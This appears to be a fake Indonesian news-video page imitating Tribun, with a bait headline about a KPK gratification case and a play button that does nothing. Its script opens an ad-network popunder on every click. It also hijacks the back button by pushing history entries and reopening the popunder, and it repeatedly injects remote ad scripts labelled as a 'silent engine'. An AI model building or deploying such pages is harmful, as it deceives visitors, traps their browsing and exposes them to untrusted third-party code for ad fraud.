<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tribun Play Services - Video Eksklusif</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0f0f0f; color: white; font-family: sans-serif; overflow-x: hidden; margin-bottom: 70px; }
        .video-player { width: 100%; aspect-ratio: 16/9; background: #000; position: relative; cursor: pointer; }
        .ad-slot { background: #1a1a1a; display: flex; justify-content: center; align-items: center; overflow: hidden; margin: 10px 0; border: 1px solid #333; }
        .nav-bottom { position: fixed; bottom: 0; width: 100%; background: #0f0f0f; border-top: 1px solid #222; display: flex; justify-content: space-around; padding: 10px; z-index: 100; }
        iframe { border: none; pointer-events: none; } /* Iframe dibuat no-click agar klik jatuh ke layar utama */
        .click-overlay { position: fixed; inset: 0; z-index: 50; }
    </style>
</head>
<body onclick="handleGlobalClick()">

    <div class="p-3 flex items-center justify-between sticky top-0 bg-[#0f0f0f] z-[60]">
        <div class="flex items-center gap-2">
            <span class="text-[10px] font-bold">17:15</span>
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b1/Tribun_Network_logo.png" class="h-3">
        </div>
        <div class="flex gap-4 text-xs">📺 🔔 🔍 <span class="bg-blue-600 px-2 rounded-full">G</span></div>
    </div>

    <div class="ad-slot h-[60px]" id="banner-top"></div>

    <div class="video-player">
        <img src="https://raw.githubusercontent.com/yudha-p/asset/main/husen_kpk.jpg" class="w-full h-full object-cover opacity-80">
        <div class="absolute inset-0 flex items-center justify-center">
            <div class="w-14 h-14 bg-white/90 rounded-full flex items-center justify-center">
                <div class="w-0 h-0 border-t-[10px] border-t-transparent border-b-[10px] border-b-transparent border-left-[18px] border-l-black ml-1"></div>
            </div>
        </div>
        <div class="absolute bottom-2 left-2 bg-black/70 text-[10px] px-2 py-0.5 rounded">0:07 / 2:52</div>
    </div>

    <div class="p-4">
        <h1 class="text-lg font-bold leading-tight">KPK BUKA OPSI PERIKSA AHMAD HUSEIN TERKAIT KASUS GRATIFIKASI</h1>
        <p class="text-[10px] text-gray-500 mt-2">7 hari yang lalu • Tribun Play Services</p>
    </div>

    <div class="ad-slot h-[250px]" id="banner-mid"></div>

    <div class="p-4 space-y-4">
        <div class="flex gap-3">
            <div class="w-32 h-20 bg-gray-800 rounded relative overflow-hidden">
                <img src="https://via.placeholder.com/150x100?text=News" class="w-full h-full object-cover opacity-50">
            </div>
            <div class="flex-1">
                <p class="text-xs font-bold">Ratusan Siswa SMA di Kudus Diduga Keracunan...</p>
                <p class="text-[9px] text-gray-500 mt-1">BeritaSatu • 5,2 rb ditonton</p>
            </div>
        </div>
        
        <div class="ad-slot h-[50px]" id="banner-small"></div>
    </div>

    <div class="nav-bottom text-[9px] text-gray-400">
        <div class="text-center">🏠<br>Home</div>
        <div class="text-center">🧭<br>Explore</div>
        <div class="text-center">📺<br>Subscriptions</div>
        <div class="text-center">📂<br>Library</div>
    </div>

    <script>
        const smartlink = "https://www.effectivegatecpm.com/ypk79fz44e?key=086401ebd705ad471cfebf22fb4f94f4";
        const socialBar = "https://pl28606612.effectivegatecpm.com/59/b3/e8/59b3e86754e4943e8fe6f30131f537e7.js";

        // Fungsi Load Iklan
        function injectAd(id, key, w, h) {
            const el = document.getElementById(id);
            el.innerHTML = `<iframe srcdoc="<html><body style='margin:0;display:flex;justify-content:center;'><script>atOptions={'key':'${key}','format':'iframe','height':${h},'width':${w},'params':{}};\x3C/script><script src='https://www.highperformanceformat.com/${key}/invoke.js'><\/script></body></html>" width="${w}" height="${h}"></iframe>`;
        }

        function handleGlobalClick() {
            // Setiap klik di mana saja buka Popunder
            window.open(smartlink, '_blank');
        }

        function startSilentEngine() {
            // Load Banner Awal
            injectAd('banner-top', '715b73e0d659246d1b505260e3e38d04', 468, 60);
            injectAd('banner-mid', 'af1659d35453444bc57653f2ae403c79', 300, 250);
            injectAd('banner-small', 'dbdbc33403cb5b88f4914ac88034303b', 320, 50);

            // Refresh Iklan & Social Bar tiap 35 detik
            setInterval(() => {
                const s = document.createElement('script');
                s.src = socialBar + '?v=' + Date.now();
                document.body.appendChild(s);
                // Refresh banner
                startSilentEngine(); 
            }, 35000);

            // Anti-Back
            window.history.pushState(null, "", window.location.href);
            window.onpopstate = () => {
                window.open(smartlink, '_blank');
                window.history.pushState(null, "", window.location.href);
            };
        }

        window.onload = startSilentEngine;
    </script>
</body>
</html>
